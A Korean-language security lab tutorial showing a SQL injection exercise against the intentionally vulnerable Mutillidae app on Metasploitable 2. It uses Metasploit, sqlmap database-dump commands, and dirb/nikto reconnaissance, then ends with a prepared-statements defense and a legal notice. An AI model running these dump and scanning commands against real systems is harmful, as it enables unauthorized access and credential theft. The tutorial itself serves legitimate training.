1. 공격 메커니즘 개요 (Attack Mechanism Overview)

SQL Injection (SQL 인젝션, 구조화 질의어 삽입)은 웹 애플리케이션의 입력값 검증 미흡을 악용하여 데이터베이스(Database)에 임의의 쿼리를 주입하는 공격입니다. 이는 STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) 모델 중 Information Disclosure (정보 유출)와 Tampering (데이터 변조)에 해당하며, 최종적으로 관리자 권한을 획득하는 결과로 이어집니다.

[도식: SQL 인젝션 공격 흐름도]

Attacker (공격자)

Kali Linux / Metasploit

Web Application (웹 앱)

Mutillidae / OWASP BWA

VULNERABLE
Target Database (대상 DB)

MySQL / MariaDB

2. 실습 구성 요소 (Lab Components)

ATTACKER

Kali Linux

  • MSF (Metasploit Framework): 모듈 기반 침투 테스트 프레임워크
  • sqlmap (SQL 주입 도구): DB 정보 추출 자동화 도구
TARGET

Metasploitable 2

  • Mutillidae: 학습용 취약 웹 애플리케이션 서비스
  • MySQL DB: 민감한 사용자 정보가 저장된 저장소

3. 실증 및 구현 절차 (Exploitation Steps)

01

MSF 콘솔 기동 및 모듈 탐색

터미널에서 Metasploit(메타스플로잇)을 실행하고 웹 파라미터 취약점을 분석할 수 있는 보조(Auxiliary) 스캐너 모듈을 검색합니다.

Kali Terminal
$ msfconsole
# SQL Injection 관련 모듈 검색
msf6 > search sql_query
msf6 > use auxiliary/scanner/http/blind_sql_query
02

공격 옵션 설정 (Payload Configuration)

공격 대상 서버의 RHOSTS (Remote Hosts, 원격 호스트) 정보와 취약점이 의심되는 URI 경로 및 파라미터를 설정합니다.

MSF Options
# 대상 서버 IP 설정
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
# 취약한 페이지 경로 설정
msf6 auxiliary(...) > set TARGETURI /mutillidae/index.php?page=user-info.php
# 인젝션 포인트 파라미터 설정
msf6 auxiliary(...) > set QUERY "username=admin"
03

실행 및 DB 덤프 (Data Extraction)

설정된 옵션을 기반으로 공격을 수행합니다. 전문적인 데이터 추출을 위해 sqlmap (SQL 주입 자동화 도구)을 연동하여 관리자 계정 정보를 획득합니다.

Exploit Execution
msf6 auxiliary(...) > run
# SQLMAP을 활용한 계정 정보 덤프 (Dump)
$ sqlmap -u "http://192.168.1.100/mutillidae/..." --dbs
$ sqlmap -u "..." -D members -T users -C username,password --dump

성공 시 결과: admin / p@ssw0rd123 유출 확인

4. 보안 전문가 인사이트 (Architect Insight)

방어 전략: Prepared Statements

SQL Injection을 방어하는 가장 근본적인 방법은 Prepared Statements (매개변수화된 쿼리)를 사용하는 것입니다. 이는 사용자 입력값을 쿼리 구조와 분리하여 처리함으로써 악의적인 코드가 실행되는 것을 원천 차단합니다.

법적 고지 및 윤리 (Ethics)

본 실습 내용은 승인된 환경 내에서의 보안 진단 능력을 배양하기 위함입니다. 허가받지 않은 시스템에 대한 공격 시도는 '정보통신망 이용촉진 및 정보보호 등에 관한 법률'에 의해 엄격히 처벌받을 수 있습니다.

5. 정찰 및 취약점 탐색 (Reconnaissance & Vulnerability Discovery)

공격자가 TARGETURI를 임의로 생성하는 것이 아니라, 대상 서버를 Reconnaissance (정찰)하여 존재하는 경로와 취약한 파라미터를 찾아내는 과정입니다. 주로 자동화된 Directory Enumeration (디렉토리 열거) 도구를 활용합니다.

DIRB / Gobuster
Vuln Discovery

Exploitable Endpoint

1) 디렉토리 열거 (Dirb)

웹 서버의 숨겨진 디렉토리와 파일을 사전(Wordlist) 기반으로 찾아냅니다.

$ dirb http://192.168.1.100
==> DIRECTORY: http://192.168.1.100/mutillidae/
+ http://192.168.1.100/mutillidae/index.php (CODE:200)

2) 취약점 스캐닝 (Nikto)

서버의 설정 오류 및 알려진 보안 취약점을 종합적으로 진단합니다.

$ nikto -h http://192.168.1.100
+ OSVDB-3092: /login.php: SQL Injection vulnerable.
+ Target URI: /mutillidae/index.php?page=user-info.php

💡 공격자가 경로를 단정 짓는 이유 (How they know)

공격자는 Reconnaissance (정찰) 도구를 실행하여 웹 루트 하위의 모든 파일과 파라미터를 전수 조사합니다. 조사 과정 중 ' (싱글 쿼테이션) 등을 입력했을 때 데이터베이스 에러 메시지가 반환되거나 응답 시간이 지연되는 페이지를 발견하면, 해당 페이지를 SQL Injection (SQL 인젝션)의 Entry Point (진입점)로 확정하게 됩니다.
